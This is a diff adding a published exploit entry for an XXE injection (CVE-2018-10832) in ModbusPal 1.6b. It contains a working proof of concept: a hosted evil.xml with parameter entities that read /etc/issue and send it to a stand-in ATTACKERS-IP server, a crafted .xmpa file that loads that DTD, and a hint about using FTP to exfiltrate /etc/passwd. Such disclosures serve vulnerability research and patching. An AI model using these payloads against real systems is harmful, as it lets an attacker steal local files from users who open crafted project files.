@@ -1,0 +1,53 @@
+[+] Exploit Title: ModbusPal XXE Injection
+[+] Date: 05-08-2018
+[+] Exploit Author: Trent Gordon
+[+] Vendor Homepage: http://modbuspal.sourceforge.net/
+[+] Software Link: https://sourceforge.net/projects/modbuspal/files/latest/download?source=files
+[+] Version: 1.6b
+[+] Tested on: Ubuntu 16.04 with Java 1.8.0_151
+[+] CVE: CVE-2018-10832
+
+1. Vulnerability Description
+
+ModbusPal 1.6b is vulnerable to an XML External Entity (XXE) attack.  Projects are saved as .xmpp files and automations can be exported as .xmpa files, both XML-based and vulnerable to XXE injection.  Sending a crafted .xmpp or .xmpa file to a user, when opened/imported in ModbusPal 1.6b, will return the contents of any local files to a remote attacker.
+
+2. Proof of Concept
+
+a.) python -m SimpleHTTPServer 9999 (listening on ATTACKERS-IP and hosting evil.xml)
+
+b.) Contents of hosted "evil.xml"
+
+<!ENTITY % data SYSTEM "file:///etc/issue">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKERS-IP:9999/?%data;'>">
+
+c.) Example Exploited "xxe.xmpa"
+
+<?xml version="1.0" ?>
+
+<!DOCTYPE r [
+
+<!ELEMENT r ANY >
+
+<!ENTITY % sp SYSTEM "http://ATTACKERS-IP:9999/evil.xml">
+
+%sp;
+
+%param1;
+
+]>
+
+<r>&exfil;</r>
+
+<!DOCTYPE modbuspal_automation SYSTEM "modbuspal.dtd">
+
+<modbuspal_automation>
+
+<automation name="temp" step="1.0" loop="true" init="0.0">
+
+</automation>
+
+</modbuspal_automation>
+
+3. Additional Details
+
+Java 1.7 contains certain defenses against XXE, including throwing a java.net.MalformedURLException when certain characters (such as '/n') are included in a URL.  This means that the file exfiltrated in the above attack is limited to single line files that dont contain any restricted characters.  The above POC uses /etc/issue, which is one of the few common linux files that meets this criteria.  Exploitation of this vulnerability on later versions of Java requires a more creative approach than described above, such as using FTP instead of URL to exfiltrate /etc/passwd.
